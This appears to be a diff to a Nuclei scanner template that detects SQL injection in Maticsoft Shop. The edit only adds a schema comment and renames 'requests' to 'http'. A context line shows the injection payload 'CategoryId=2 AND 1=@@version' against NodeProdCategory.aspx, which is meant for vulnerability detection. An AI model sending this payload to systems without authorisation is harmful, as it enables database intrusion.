@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: Maticsoft-Shop-sqli
 
 info:
@@ -6,7 +7,7 @@ info:
   severity: high
   tags: Maticsoft,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/NodeProdCategory.aspx?action=GetChildNode&CategoryId=2%20AND%201=@@version"
